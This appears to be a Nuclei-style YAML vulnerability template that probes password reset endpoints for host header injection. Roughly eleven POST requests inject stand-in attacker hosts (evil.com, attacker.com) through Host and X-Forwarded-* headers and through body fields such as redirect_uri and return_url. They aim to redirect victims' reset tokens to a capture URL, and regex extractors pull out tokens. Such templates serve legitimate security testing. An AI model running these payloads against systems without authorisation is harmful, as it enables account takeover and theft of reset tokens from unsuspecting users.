id: medium-webapp-host-header-injection-password-reset

info:
  name: Host Header Injection Password Reset - Elite Red Team
  author: elite-red-team
  severity: high
  description: |
    Advanced host header injection in password reset functionality.
    Tests for host header manipulation that can lead to password reset token hijacking.
    Includes multiple bypass techniques and email poisoning attacks.
  reference:
    - https://portswigger.net/web-security/host-header
    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
    cvss-score: 8.1
    cwe-id: CWE-20
  tags: host-header-injection,password-reset,email-poisoning,red-team

variables:
  # Malicious hosts for injection
  evil_hosts:
    - "evil.com"
    - "attacker.com"
    - "malicious.net"
    - "127.0.0.1"
    - "localhost"

http:
  - method: POST
    path:
      - "{{BaseURL}}/password-reset"
      - "{{BaseURL}}/forgot-password"
      - "{{BaseURL}}/reset-password"
      - "{{BaseURL}}/api/password-reset"
      - "{{BaseURL}}/auth/forgot-password"
      - "{{BaseURL}}/user/password-reset"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: evil.com
      X-Forwarded-For: 127.0.0.1
      X-Real-IP: 127.0.0.1

    body: |
      email=victim@example.com

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302

      - type: word
        part: body
        words:
          - "reset"
          - "sent"
          - "email"
          - "link"
          - "password"
        condition: or

      - type: word
        part: body
        words:
          - "invalid host"
          - "host not allowed"
          - "forbidden host"
        condition: and
        negative: true

    extractors:
      - type: regex
        part: body
        regex:
          - 'https?://([^/\s]+)/reset'
          - 'reset[_-]?token["\']:\s*["\']([^"\']+)'

  - method: POST
    path:
      - "{{BaseURL}}/password-reset"
      - "{{BaseURL}}/forgot-password"

    headers:
      Content-Type: application/json
      Host: {{Hostname}}
      X-Forwarded-Host: attacker.com
      X-Host: malicious.net
      X-Forwarded-Server: evil.com

    body: |
      {
        "email": "victim@example.com"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: body
        words:
          - "reset"
          - "sent"
          - "success"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/password-reset"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: {{Hostname}}:80@evil.com
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

    body: |
      email=victim@example.com&redirect_url=https://evil.com/capture

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302

      - type: word
        part: body
        words:
          - "reset"
          - "email"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/forgot-password"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: [evil.com]
      X-Forwarded-Proto: https

    body: |
      username=victim&email=victim@example.com

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "reset"
          - "sent"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/password-reset"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: {{Hostname}}
      X-Forwarded-Host: evil.com:443
      X-Forwarded-Proto: https
      X-Forwarded-Port: 443

    body: |
      email=victim@example.com&callback=https://evil.com/reset-callback

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302

      - type: word
        part: body
        words:
          - "reset"
          - "callback"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/auth/forgot-password"

    headers:
      Content-Type: application/json
      Host: {{Hostname}}
      X-Original-Host: evil.com
      X-Rewrite-URL: /reset-hijack

    body: |
      {
        "email": "victim@example.com",
        "return_url": "https://evil.com/capture-token"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "reset"
          - "return_url"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/password-reset"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: {{Hostname}}
      X-Host: evil.com
      X-Forwarded-For: 127.0.0.1
      Origin: https://evil.com

    body: |
      email=victim@example.com

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "reset"
          - "email"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/forgot-password"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: {{Hostname}}
      X-Forwarded-Host: evil.com/reset-capture
      Referer: https://evil.com

    body: |
      email=victim@example.com&next=/dashboard

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302

      - type: word
        part: body
        words:
          - "reset"
          - "next"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/user/password-reset"

    headers:
      Content-Type: application/json
      Host: {{Hostname}}
      X-Forwarded-Host: evil.com
      X-Forwarded-Proto: https
      X-Forwarded-Port: 443
      X-Forwarded-Prefix: /hijack

    body: |
      {
        "email": "victim@example.com",
        "client_id": "web_app",
        "redirect_uri": "https://evil.com/token-capture"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "reset"
          - "redirect_uri"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/password-reset"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: {{Hostname}}
      X-Forwarded-Host: evil.com
      X-Forwarded-SSL: on
      X-Url-Scheme: https

    body: |
      email=victim@example.com&template=custom&base_url=https://evil.com

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "reset"
          - "template"
          - "base_url"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/password-reset"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Host: {{Hostname}}
      X-Forwarded-Host: evil.com
      X-Cluster-Client-IP: 127.0.0.1
      CF-Connecting-IP: 127.0.0.1

    body: |
      email=victim@example.com&lang=en&domain=evil.com

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "reset"
          - "domain"
        condition: or

    extractors:
      - type: regex
        part: response
        regex:
          - 'Location:\s*https?://([^/\s]+)'
          - 'href=["\']https?://([^/"\'\s]+)'
          - '"reset_url":\s*"https?://([^/"\s]+)'
          - 'action=["\']https?://([^/"\'\s]+)'